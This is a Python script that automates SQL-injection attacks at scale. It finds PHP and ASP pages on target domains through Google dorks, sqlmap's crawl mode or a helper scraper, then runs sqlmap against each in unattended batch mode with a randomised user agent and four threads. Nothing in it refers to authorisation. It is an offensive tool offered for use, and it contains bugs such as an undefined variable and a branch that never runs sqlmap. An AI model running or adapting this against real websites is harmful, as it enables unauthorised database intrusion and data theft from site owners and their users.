#works in python 3(selenium changed version,that's myenv)
#coz line53 & line73 use a function from a py3 module,but
#that is not necessary
import os
import re
def static_sqli(url):
	#re.search("",url)
	pass

def sqlmap_g_nohuman(http_url_or_file):
	#this function use sqlmap's "-g" option to find sqli urls,but this "-g"
	#option can only get 100 results due to google api restriction,but in 
	#this mode,there is no need for us human to handle any situation.
	if re.match("(http://)|(https://)",http_url_or_file):
		domain_url=http_url_or_file[7:] if re.match("(http://)",http_url_or_file) else http_url_or_file[8:]
		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp" --smart --batch -v 3 --threads 4 --random-agent''' % domain_url
		print("sqlmap_string is:%s" % sqlmap_string)
		#sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
		os.system("/usr/bin/python2.7 %s" % sqlmap_string)

	else:
		fp=open(http_url_or_file,"r+")
		all_urls=fp.readlines()
		fp.close()
		for each in all_urls:			
			domain_url=each[7:] if re.match("(http://)",each) else each[8:]
			sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp" --smart --batch -v 3 --threads 4 --random-agent''' % domain_url
			print("sqlmap_string is:%s" % sqlmap_string)
			#sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
			os.system("/usr/bin/python2.7 %s" % sqlmap_string)

def sqlmap_craw(origin_http_url_or_file):
	#this function use sqlmap's "--crawl" option to find sqli urls.
	if re.match("(http://)|(https://)",origin_http_url_or_file):
		origin_http_url=re.sub(r'(\s)',"",origin_http_url_or_file)
		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --smart -v 3 --threads 4 --batch --random-agent''' % origin_http_url
		print("sqlmap_string is:%s" % sqlmap_string)
	else:
		fp=open(origin_http_url_or_file,"r+")
		all_urls=fp.readlines()
		fp.close()
		for each in all_urls:	
			origin_http_url=re.sub(r'(\s)',"",each)		
			sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --smart -v 3 --threads 4 --batch --random-agent''' % origin_http_url
			print("sqlmap_string is %s" % sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % sqlmap_string)


def sqlmap_g_human(http_url_or_file):
	#this function use myGoogleScraper to search google dork to get the full
	#urls,in this mode,we need input the yanchengma by human,not robot,coz 
	#sqlmap's -g option can only get the former 100 results,this function will
	#get almost the all results.
	if re.match("(http://)|(https://)",http_url_or_file):
		domain_url=http_url_or_file[7:] if re.match("(http://)",url_or_file) else http_url_or_file[8:]
		query='''site:%s inurl:php|asp''' % domain_url
		#import easy_search
		#search_url_list=blew expression
		#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
		os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % query)#here myenv/python3.5 is the selenium changed version
		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 3 --smart --batch --threads 4 --random-agent'''
		print("sqlmap_string is:%s" % sqlmap_string)
		os.system("/usr/bin/python2.7 %s" % sqlmap_string)
	else:
		#print(666666661111111)
		try:
			fp=open(http_url_or_file,"r+")
		except:
			print("open file error")
		all_urls=fp.readlines()
		#print("open file 666666")
		print(55555)
		print(all_urls)
		fp.close()
		for each in all_urls:
			domain_url=each[7:] if re.match("(http://)",each) else each[8:]
			print(6666)
			print(domain_url)
			query='''site:%s inurl:php|asp''' % domain_url
			#import easy_search
			#search_url_list=blew expression
			#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
			os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % query)#here myenv/python3.5 is the selenium changed version
		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 3 --smart --batch --threads 4 --random-agent'''
		print("sqlmap_string is:%s" % sqlmap_string)
		os.system("/usr/bin/python2.7 %s" % sqlmap_string)

def main():
	sqlmap_g_human("targets.txt")
if __name__ == '__main__':
	main()